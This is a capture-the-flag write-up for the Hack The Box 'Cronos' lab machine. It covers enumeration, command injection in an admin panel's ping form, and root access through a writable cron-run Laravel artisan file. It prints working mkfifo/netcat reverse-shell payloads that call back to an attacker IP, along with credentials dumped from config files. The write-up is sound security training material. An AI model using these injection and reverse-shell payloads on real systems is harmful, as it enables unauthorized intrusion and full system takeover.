# cronos from htb

## nmap


```bash
sudo nmap 10.129.227.211 -p- -T5 | tee nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-07 20:58 UTC
Warning: 10.129.227.211 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.227.211
Host is up (0.030s latency).
Not shown: 65085 closed tcp ports (reset), 447 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 488.40 seconds
```

## Web enumeration
Firstly, I enumerated the website. At http://10.129.227.211:80/, it only had the default apache install page.

Seeing DNS is open though, I checked it out.
```bash
┌─[user@parrot]─[~]                                                                                                                           
└──╼ $nslookup 10.129.227.211 10.129.227.211                                                                                                  
211.227.129.10.in-addr.arpa     name = ns1.cronos.htb.
```
I added `cronos.htb` and `ns1.cronos.htb` to my /etc/hosts. Doing an AXFR Dig didnt work over dns.

Enumerating the website at http://cronos.htb/, laravel was running in debug mode, I didn't find anything interesting though.

```bash
┌─[user@parrot]─[~]                                                                                                                           
└──╼ $ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://cronos.htb/ -H "Host: FUZZ.cronos.htb" -fw 3534    
 :: Method           : GET                                                                                                                    
 :: URL              : http://cronos.htb/                                                                                                     
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt                                               
 :: Header           : Host: FUZZ.cronos.htb                                                                                                  
 :: Follow redirects : false                                                                                                                  
 :: Calibration      : false                                                                                                                  
 :: Timeout          : 10                                                                                                                     
 :: Threads          : 40                                                                                                                     
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3534
________________________________________________

www                     [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 1814ms]
admin                   [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 4848ms]

```
I did find an open admin subdomain, so I added it to my hosts file.

## Web exploitation

Checking out the page at http://admin.cronos.htb/, I saw a login page. Trying credentials like admin:admin yielded no results.

The login does run on index.php, so I fuzzed for .php files. Through that, I found theres a welcome.php page which returns a 302. 

I decided to check it out anyway, and the website returns the pages contents even upon redirection.
```html
<form method="POST" action="">
	<select name="command">
		<option value="traceroute">traceroute</option>
		<option value="ping -c 1">ping</option>
	</select>
	<input type="text" name="host" value="8.8.8.8"/>
	<input type="submit" value="Execute!"/>
```
This login form seemed interesting, as it was sending bash code to welcome.php through a post request. 

I tested making a post request for it with:
```mysql
POST /welcome.php HTTP/1.1                                                                                                                    
Host: admin.cronos.htb                                                                                                                        
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0                                                            
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8                                                                       
Accept-Language: en-US,en;q=0.5                                                                                                               
Accept-Encoding: gzip, deflate, br                                                                                                            
DNT: 1                                                                                                                                        
Connection: keep-alive                                                                                                                        
Cookie: PHPSESSID=ui0u6t6evhjjcofm8f6c26ctv6                                                                                                  
Upgrade-Insecure-Requests: 1                                                                                                                  
Priority: u=0, i                                                                                                                              
Content-Type: application/x-www-form-urlencoded                                                                                               
Content-Length: 25                                                                                                                            
                                                                                                                                              
command=ping+-c+1+8.8.8.8 
```
The page returned:
```html
</form>                                                                                                                                       
                        PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.<br>                                                                      
                <br>                                                                                                                          
                --- 8.8.8.8 ping statistics ---<br>                                                                                           
                1 packets transmitted, 0 received, 100% packet loss, time 0ms<br>                                                             
                <br>                                                                                                                          
                      <p><a href = "logout.php">Sign Out</a>                                                                                  
                                                                                                                                              
```
I got a www-data webshell using a netcat payload with:
```mysql
POST /welcome.php HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=ui0u6t6evhjjcofm8f6c26ctv6
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

command=ping+-c+1+8.8.8.8%0arm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.162+6969+>/tmp/f
```
I decided to keep the original ping command, incase there was some filtering.
Upon sending the request, I got the shell as www-data.
```bash
┌─[user@parrot]─[~/htb/cronos]
└──╼ $nc -lvnp 6969
Listening on 0.0.0.0 6969
Connection received on 10.129.227.211 41824
/bin/sh: 0: can't access tty; job control turned off
$  
```
## Privilege Escalation
I firstly upgraded my shell with python
```bash
$ which python                     
/usr/bin/python
$ /usr/bin/python -c 'import pty;pty.spawn("/bin/bash")'
www-data@cronos:/var/www/admin$ ^Z
[1]+  Stopped                 nc -lvnp 6969
┌─[✗]─[user@parrot]─[~/htb/cronos]
└──╼ $stty raw -echo; fg
nc -lvnp 6969

www-data@cronos:/var/www/admin$
```
Sudo didn't have NOPASSWD.
I did find some config passwords like
```bash
www-data@cronos:/var/www/admin$ cat config.php 
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE); 
?>
```
This password only worked for the database. Checking out login.php, I saw it was md5.
```mysql
mysql> show tables;
+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
```
The hash for admin doesn't match the md5sum of DB_PASSWORD, crackstation didn't have it, and rockyou.txt with best64.rule didn't crack it either.

A config file in one of the laravel configs
```config
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=homestead
DB_USERNAME=homestead
DB_PASSWORD=secret
```
It's mysql user couldn't connect, and password didn't work for any local user.


Checking out /etc/crontab:
```bash
www-data@cronos:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'         
# command to install the new version when you edit this file           
# and files in /etc/cron.d. These files also have username fields,     
# that none of the other crontabs do.                                  

SHELL=/bin/sh                      
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin      

# m h dom mon dow user  command    
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly    
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )                                           
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )                                          
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )                                         
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1                                                           
```
That artisan script seemed interesting, as I saw earlier I had write access to all of the laravel files.

I replaced the artisan file's contents with
```php
<?php
  system("rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/sh -i 2>&1|nc 10.10.14.162 6970 >/tmp/a");
?>
```
After waiting for a minute, I got a shell as root:
```
┌─[user@parrot]─[~]
└──╼ $nc -lvnp 6970
Listening on 0.0.0.0 6970
Connection received on 10.129.227.211 48880
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
#
```
